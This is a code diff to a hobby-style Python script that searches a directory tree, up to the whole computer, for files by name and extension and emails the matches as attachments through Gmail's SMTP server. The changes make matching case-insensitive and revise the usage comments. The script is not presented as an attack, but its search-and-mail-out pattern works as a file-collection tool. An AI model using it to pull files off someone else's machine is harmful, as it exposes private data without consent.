@@ -17,7 +17,7 @@ def findfile(name, extensions, path):
     files = []
     for dirpath, dirname, filename in os.walk(path):
         for item in filename:
-            if name in str.lower(item):
+            if str.lower(name) in str.lower(item):
                 if extensions != []:
                     for extension in extensions:
                         if extension in item:
@@ -27,13 +27,11 @@ def findfile(name, extensions, path):
     return files
 
 # Instructions on usage of findfile():
-#   - Enter term below IN LOWERCASE that you want to search in the first parameter,
-#   - Enter extension you want to search for. please enter it as a list, wether or not you want more than one type of file
+#   - Enter term that you want to search in the first parameter,
+#   - Enter extensions you want to search for as the second parameter. please enter it as a list, wether or not you want more than one type of file
 #   - Leave the extension as a blank list if you want all file types
-#   - Then for the thrid paramter add the root path you want to start searching from
-#   - For the whole computer, put "/" for mac or "\" for windows
-#     as it is where most people store their files, and there is not point looking through system files
-
+#   - Then for the third paramter add the root path you want to start searching from
+#   - For the whole computer, put "/" for mac or "\" for windows (WARNING: UNSTABLE - windows may contain .lnk files which are against google t&cs and may lead to program crashing if no specific file extensions are selected)
 
 # --------------------- main program starts here ----------------------------
 
@@ -52,7 +50,6 @@ for file in files:
         filedata = data.read()
         filename = file.split("/") # splits the name by a "/" which is what seperates the structure of files
         filename = filename[-1] # takes the last item from the structure list as it will always be the name of the file. used for efficiency purposes when searching through recieved files
-    
     msg.add_attachment(filedata, maintype="application", subtype="octet-stream", filename=filename)
 
 with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server: # Establishes connection with server
